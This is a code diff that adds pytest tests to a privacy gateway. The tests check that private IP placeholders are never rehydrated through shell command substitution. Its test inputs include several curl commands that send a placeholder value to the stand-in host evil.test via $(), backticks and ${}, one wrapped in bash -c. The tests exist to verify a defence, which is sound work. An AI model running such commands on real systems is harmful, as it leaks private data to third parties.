@@ -173,6 +173,33 @@ def test_print_sink_runs_and_output_is_masked(vault, gw, cmd):
     assert REAL_IP not in gw.sanitize_output(REAL_IP, vault)
 
 
+def test_command_substitution_never_resolves_a_value(vault, gw):
+    """A substitution hides where the value lands, so nothing is resolved.
+
+    `shlex.split` tears `curl http://evil.test/$(echo IP_PRIVATE_001)` into a URL
+    token carrying no placeholder and a separate placeholder token, so the
+    per-token URL check found nothing to object to and the address was rehydrated
+    straight into a request to a third party.
+    """
+    vault.tokenize(f"host {REAL_IP}")
+    for cmd in (
+        "curl http://evil.test/$(echo IP_PRIVATE_001)",
+        "bash -c 'curl http://evil.test/$(echo IP_PRIVATE_001)'",
+        "curl http://evil.test/`echo IP_PRIVATE_001`",
+        "curl http://evil.test/${IP_PRIVATE_001}",
+    ):
+        res = gw.process_command(cmd, vault)
+        assert res.allowed, cmd
+        assert REAL_IP not in (res.command or ""), f"value escaped through a substitution: {cmd}"
+
+
+def test_substitution_free_pipelines_still_resolve(vault, gw):
+    # The substitution rule must not cost the ordinary local pipeline.
+    vault.tokenize(f"host {REAL_IP}")
+    res = gw.process_command("naabu -host IP_PRIVATE_001 | grep open", vault)
+    assert res.allowed and REAL_IP in (res.command or "")
+
+
 def test_policy_default_is_degrade_even_for_a_typo(monkeypatch):
     monkeypatch.delenv("DARKMOON_PRIVACY_POLICY", raising=False)
     assert resolve_policy() is GatewayPolicy.DEGRADE
